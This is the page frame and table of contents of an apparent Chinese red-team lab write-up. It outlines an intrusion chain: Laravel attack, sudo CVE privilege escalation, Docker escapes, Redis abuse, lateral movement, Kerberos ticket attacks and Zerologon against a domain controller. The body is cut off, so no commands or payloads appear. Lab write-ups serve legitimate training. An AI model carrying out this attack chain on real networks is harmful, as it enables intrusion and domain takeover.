<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>红队靶场-7 | J3fffff&#39;s Blog</title><meta name="description" content="基础环境设置 192.168.95.143 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;9eek&#x2F;p&#x2F;16703300.html  Ubuntu1 web1  信息搜集 开启端口： 22 ssh&#x2F; 80 81 laravel &#x2F; 6379 redis2.8.17 &#x2F; os linux4.15-5.8  攻击Laravel 扫描发现80 81 6379端口，访问80端口发现是Nginx代理到8"><meta property="og:type" content="article"><meta property="og:title" content="红队靶场-7"><meta property="og:url" content="https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/index.html"><meta property="og:site_name" content="J3fffff&#39;s Blog"><meta property="og:description" content="基础环境设置 192.168.95.143 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;9eek&#x2F;p&#x2F;16703300.html  Ubuntu1 web1  信息搜集 开启端口： 22 ssh&#x2F; 80 81 laravel &#x2F; 6379 redis2.8.17 &#x2F; os linux4.15-5.8  攻击Laravel 扫描发现80 81 6379端口，访问80端口发现是Nginx代理到8"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714093124402.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714095845843.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714100122687.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714104612542.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111147194.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111401102.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111503937.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714114410437.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714131934378.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714113900832.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133329073.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133643490.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714144825877.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714145429570.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714152845811.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714155117566.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721100733862.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721101735016.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721104536431.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721105246123.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721110846926.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111244409.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111757397.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111822064.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721140617156.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721141149902.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721150954348.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721152615512.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721162737931.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727144550596.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/9fa2405ea218d96cef3e6995b578ebb5.jpg"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727135555788.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727140234573.png"><meta property="og:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727161341392.png"><meta property="article:published_time" content="2023-07-13T12:49:46.000Z"><meta property="article:modified_time" content="2023-07-13T12:49:46.000Z"><meta property="article:author" content="Jeff"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://j3f5.github.io/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714093124402.png"><link rel="canonical" href="https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/index.html"><link rel="alternate" href="/atom.xml" title="J3fffff&#39;s Blog" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css">   <link rel="stylesheet" href="/css/theme/monokai-hook.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.3.0"></head><body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/j3f5" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">妄想星空</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Pentestor</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">标签</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎交流与分享经验!</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">JAVA安全基础</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">开发基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/">打靶</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/">车联网基础</a><span class="category-list-count">4</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CAN/" rel="tag">CAN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JWT/" rel="tag">JWT</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf%E7%BB%95%E8%BF%87/" rel="tag">waf绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" rel="tag">业务逻辑</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%AB%E6%8C%81/" rel="tag">劫持</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag">博客搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" rel="tag">审计技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" rel="tag">整体流程</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" rel="tag">渗透技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" rel="tag">漏洞发现</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A0%B4%E8%A7%A3/" rel="tag">破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%8A%E6%96%AD/" rel="tag">诊断</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F/" rel="tag">跨域</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" rel="tag">车联网标准</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/CAN/" style="font-size:13px">CAN</a> <a href="/tags/CSRF/" style="font-size:13.33px">CSRF</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/RCE/" style="font-size:13.33px">RCE</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/XSS/" style="font-size:13.67px">XSS</a> <a href="/tags/XXE/" style="font-size:13.33px">XXE</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size:14px">sql注入</a> <a href="/tags/waf%E7%BB%95%E8%BF%87/" style="font-size:13px">waf绕过</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" style="font-size:13px">业务逻辑</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8A%AB%E6%8C%81/" style="font-size:13px">劫持</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size:13px">协议</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size:13px">博客搭建</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" style="font-size:13px">审计技巧</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" style="font-size:13.33px">整体流程</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13.33px">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:13px">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size:13px">文件读取</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size:13.33px">权限提升</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" style="font-size:13px">渗透技巧</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size:13px">漏洞发现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size:13.33px">漏洞扫描</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size:13px">破解</a> <a href="/tags/%E8%AF%8A%E6%96%AD/" style="font-size:13px">诊断</a> <a href="/tags/%E8%B7%A8%E5%9F%9F/" style="font-size:13px">跨域</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" style="font-size:13px">车联网标准</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">13</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/articles/2023/09/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/09/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/" class="title">面试整理</a></p><p class="item-date"><time datetime="2023-09-10T01:27:17.000Z" itemprop="datePublished">2023-09-10</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/" class="title">NTLM-relay复现</a></p><p class="item-date"><time datetime="2023-08-14T07:55:16.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/" class="title">relay复现</a></p><p class="item-date"><time datetime="2023-08-14T07:55:03.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/PTT%E4%B8%8EMS14-068/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/PTT%E4%B8%8EMS14-068/" class="title">PTT与MS14-068</a></p><p class="item-date"><time datetime="2023-08-14T07:09:17.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/" class="title">MS14-068复现</a></p><p class="item-date"><time datetime="2023-08-14T06:10:12.000Z" itemprop="datePublished">2023-08-14</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">基础环境设置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ubuntu1-web1"><span class="toc-number">2.</span> <span class="toc-text">Ubuntu1 web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BBlaravel"><span class="toc-number">2.2.</span> <span class="toc-text">攻击Laravel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.1.</span> <span class="toc-text">SUID+环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.2.</span> <span class="toc-text">sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-3156"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">CVE-2021-3156</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2023-22809"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">CVE-2023-22809</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8"><span class="toc-number">2.4.</span> <span class="toc-text">docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9Edocker%E9%80%83%E9%80%B8"><span class="toc-number">2.4.1.</span> <span class="toc-text">脏牛漏洞docker逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2020-15257%E9%80%83%E9%80%B8"><span class="toc-number">2.4.2.</span> <span class="toc-text">CVE-2020-15257逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2019-5736"><span class="toc-number">2.4.3.</span> <span class="toc-text">CVE-2019-5736</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">2.4.4.</span> <span class="toc-text">docker配置不当</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E9%80%83%E9%80%B8"><span class="toc-number">2.4.4.1.</span> <span class="toc-text">特权逃逸</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ubuntu1%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BFmsf"><span class="toc-number">3.</span> <span class="toc-text">Ubuntu1主机上线msf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E5%86%99%E5%85%A5ssh"><span class="toc-number">3.1.</span> <span class="toc-text">redis写入ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">写入计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">主从复制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ubuntu2%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BFmsf"><span class="toc-number">4.</span> <span class="toc-text">Ubuntu2主机上线msf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="toc-number">4.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99ssh%E5%AF%86%E9%92%A5"><span class="toc-number">4.2.</span> <span class="toc-text">写ssh密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0fscan%E6%89%AB%E5%86%85%E7%BD%91"><span class="toc-number">4.3.</span> <span class="toc-text">上传fscan扫内网</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pc-1"><span class="toc-number">5.</span> <span class="toc-text">PC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-3"><span class="toc-number">5.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">5.2.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91"><span class="toc-number">5.3.</span> <span class="toc-text">横向</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pc2"><span class="toc-number">6.</span> <span class="toc-text">PC2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91"><span class="toc-number">6.1.</span> <span class="toc-text">域横向</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dc%E5%9F%9F%E6%8E%A7"><span class="toc-number">7.</span> <span class="toc-text">DC域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#spn"><span class="toc-number">7.1.</span> <span class="toc-text">SPN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pth"><span class="toc-number">7.2.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%B8%8Ems14-068%E4%BB%A5pc2%E8%BF%9B%E8%A1%8C%E4%B8%8Eptk"><span class="toc-number">7.3.</span> <span class="toc-text">金&#x2F;银票据与MS14-068（以PC2进行）与PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dcomsmbwmi%E9%83%BD%E6%98%AFimpacket%E5%B0%B1%E4%B8%8D%E8%AF%B4%E4%BA%86"><span class="toc-number">7.4.</span> <span class="toc-text">DCOM&#x2F;SMB&#x2F;WMI（都是impacket，就不说了）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zerologon-cve-2020-1472"><span class="toc-number">7.5.</span> <span class="toc-text">ZEROLogon CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E5%9F%9F%E6%8E%A7%E4%B9%8B%E5%90%8E"><span class="toc-number">7.6.</span> <span class="toc-text">拿到域控之后</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article 